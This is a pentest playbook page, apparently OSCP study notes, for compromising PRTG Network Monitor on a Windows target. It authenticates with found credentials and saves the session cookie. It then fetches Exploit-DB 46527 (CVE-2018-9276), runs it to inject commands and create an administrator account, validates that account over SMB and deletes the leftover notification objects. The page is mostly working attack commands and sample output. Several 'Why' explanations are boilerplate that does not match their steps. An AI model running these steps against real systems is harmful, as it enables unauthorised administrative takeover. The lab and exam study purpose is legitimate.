# Windows - Web - PRTG

**Windows web supplement**

Use this page when HTTP identifies PRTG Network Monitor and FTP or another source provides a candidate credential.

## 1. Check the version and login endpoint

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
curl -s -o /dev/null -w "%{http_code}\n" http://$BoxIP:$WebPort/
curl -s -L -c $BoxDir/loot/cookies.txt -o $BoxDir/loot/dashboard.htm \
  -w "login_status=%{http_code}\nfinal_url=%{url_effective}\n" \
  -d "username=$Username&password=$Password&loginurl=" \
  http://$BoxIP:$WebPort/public/checklogin.htm
```

## Example output

```text
login_status=200
final_url=http://$BoxIP:$WebPort/welcome.htm
```

## What did you get?

- **200 and a welcome redirect:** run `grep -i session $BoxDir/loot/cookies.txt` to confirm the cookie was saved, then continue.
- **401 or a failed redirect:** rerun the login request with `$Username` and `$Password`, then confirm the PRTG version before retrying.
- **404:** confirm the service and base path before trying the exploit.

## 2. Search for the authenticated exploit

> **Why:** This version or banner check identifies the exact product release before a matching public exploit is considered.
```bash
searchsploit PRTG
searchsploit -m 46527
mv 46527.sh $BoxDir/exploits/
```

The relevant entry is CVE-2018-9276, where the notification Execute Program action allows authenticated command injection.

## Example output

```text
PRTG Network Monitor 18.x - Authenticated Remote Code Execution
Exploit: 46527
```

## What did you get?

Use the matching exploit only after authentication succeeds. Run the cookie-extraction command below, then execute the copied exploit.

> **Why:** This command gathers the windows web prtg evidence needed to decide which documented route applies next.
```bash
Cookie=$(awk 'NF>=7 {sub(/^#/,"",$1); print $6"="$7}' $BoxDir/loot/cookies.txt | paste -sd';' -)
bash $BoxDir/exploits/46527.sh -u http://$BoxIP -c "$Cookie"
```

## Example output

```text
[*] sending notification
[*] exploit completed
[*] new administrator account created
```

## What did you get?

Run `netexec smb $BoxIP -u $Username2 -p $Password2` to validate the created account, then use the resulting administrative access for a shell. Record the number of notification objects created by each run.

## 3. Clean up notification objects

List notifications before deleting anything.

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
curl -s -b "$Cookie" "http://$BoxIP/api/table.json?content=notifications&output=json&columns=objid,name,active"
for NotificationId in $NotificationIds; do
  curl -s -b "$Cookie" "http://$BoxIP/api/deleteobject.htm?id=$NotificationId&approve=1"
done
curl -s -b "$Cookie" "http://$BoxIP/api/table.json?content=notifications&output=json&columns=objid,name,active"
```

## Example output

```text
temporary objects present
built-in objects remain
```

## What did you get?

- **Only built-in objects remain:** cleanup is complete.
- **Temporary objects remain:** run the deletion request with `approve=1` and the exact object IDs, then rerun the listing request.
- **No output or no change:** rerun the deletion request with `approve=1` and the current `$Cookie`, then rerun the notification listing request.

## Gotcha

Delete target files while the temporary account still works, then delete the account. In a Windows command shell use `dir` and `type`, not `ls` and `cat`.

## External Resources

- [Exploit-DB 46527](https://www.exploit-db.com/exploits/46527)
- [Paessler PRTG object manipulation](https://www.paessler.com/manuals/prtg/object_manipulation)
## Seen in
- *(no write-up yet)*

## Related stages

- [[Windows - Service Scan]]
- [[Windows - Web Enum]]
- [[Windows - SMB Enum]]
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
